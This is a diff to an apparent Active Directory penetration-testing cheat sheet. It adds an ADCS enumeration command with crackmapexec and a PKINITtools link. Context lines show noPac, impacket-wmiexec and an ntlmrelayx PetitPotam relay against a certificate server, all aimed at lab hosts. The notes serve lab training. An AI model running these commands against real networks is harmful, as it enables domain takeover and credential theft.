@@ -1287,6 +1287,11 @@ python3 noPac.py htb.local/svc_test:testpass -dc-ip 172.16.5.5  -dc-host ACADEMY
 ```
 
 ### ADCS
+```bash
+# find service
+crackmapexec ldap 172.16.117.0/24 -u  -p '' -M adcs
+```
+
 https://github.com/secure-77/Certipy-Docker
 ```powershell
 # Cert request
@@ -1325,7 +1330,9 @@ impacket-wmiexec -k -no-pass authority.htb/Administrator@authority.authority.htb
 ```
 #### PetitPotam
 https://github.com/topotam/PetitPotam<br/>
-https://github.com/ly4k/PetitPotam
+https://github.com/ly4k/PetitPotam<br/>
+
+https://github.com/dirkjanm/PKINITtools
 ```bash
 # listener
 sudo ntlmrelayx.py -debug -smb2support --target http://target.htb.local/certsrv/certfnsh.asp --adcs --template DomainController
